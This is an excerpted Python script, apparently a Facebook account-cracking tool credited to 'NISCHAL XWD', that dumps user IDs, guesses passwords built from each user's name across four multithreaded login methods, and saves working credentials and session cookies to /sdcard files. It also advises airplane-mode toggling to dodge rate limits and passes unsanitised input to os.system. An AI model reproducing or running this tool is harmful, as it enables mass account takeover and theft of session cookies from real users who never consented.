#!/usr/bin/python
#Original written By NISCHAL XWD
#JOIN WHATSAPP GROUP:https://chat.whatsapp.com/DN5gBJnafyZAceDOQWrx4E
import os,zlib
...
from concurrent.futures import ThreadPoolExecutor as NischalNISCHAL
from string import * 
...
sys.stdout.write('\x1b]2; NISCHAL\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
\033[1;37m------------------------------------------------
\033[1;37m Owner   :            NISCHAL XWD
\033[1;37m Facebook:            Ni sc hal
\033[1;37m Github  :            nischalsiwakoti
\033[1;37m Version :            10
\033[1;37m------------------------------------------------ """
def clear():
    os.system("clear")
    print(logo)    
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("Press enter to back Nischal Menu ")
        exit()
...
def Nischal():   
    ...
    if select =='1':
       ...
       cutter()
        ...
        os.system('https://chat.whatsapp.com/DN5gBJnafyZAceDOQWrx4E')
        pass
    else:
        print('\n Select valid option ... ')
        time.sleep(2)
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[NISCHAL] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);NISCHALb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={NISCHALb};{ckkk}"
                    print(f"\r{R} [NISCHAL-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/NISCHAL_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/NISCHAL_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [NISCHAL-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/NISCHAL_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[NISCHAL] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [NISCHAL-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/NISCHAL_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/NISCHAL_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [NISCHAL-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[NISCHAL] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[NISCHAL] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [NISCHAL-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/NISCHAL_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def pasw(self):       
            ...
            print(f"\r{A}Use flight (airplane) mode before use {NISCHAL}")
            print(47*"-")
            print(f'{NISCHAL} Total IDs : %s ' % len(self.id))
            print(f'{NISCHAL} Cracking Started...')
            print(47*"-")
            with NischalNISCHAL(max_workers=30) as NISCHALworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                NISCHALworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                NISCHALworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                NISCHALworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                NISCHALworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
    ...
    try:
        ...
        for rept in range(srange):
            ...
            try:
                ...
                print(f"\n{S}ID Not Found ...");pass
                menu()
        print(f'File Name To Dump Ids. Example /sdcard/NISCHAL.txt') 
        print(47*"-")
...
def sids():
    ...
    clear()
    print('\033[1;37mExample: /sdcard/NISCHAL.txt\033[0;97m')
    print(47*'-')
...
def cutter():
    ...
    NISCHAL = input('Put File Name :')
    print(" ")
    Nischal = input('Saving Put File Name :')
    os.system('touch ' +Nischal)
    os.system('sort -r '+NISCHAL+' | uniq > '+Nischal)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + NISCHAL )
    print(47*'-')
    print("File Saved To :" + Nischal )
    print(47*'-')
    input(f"{S} Press Enter To Back NISCHAL Menu ")
    menu
...
def p_dump():
    ...
    try:
        ...
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        print(f'{S}File Name To Dump Ids. Example /sdcard/NISCHAL.txt\n') 
        filepath = input("Put File Name: ")
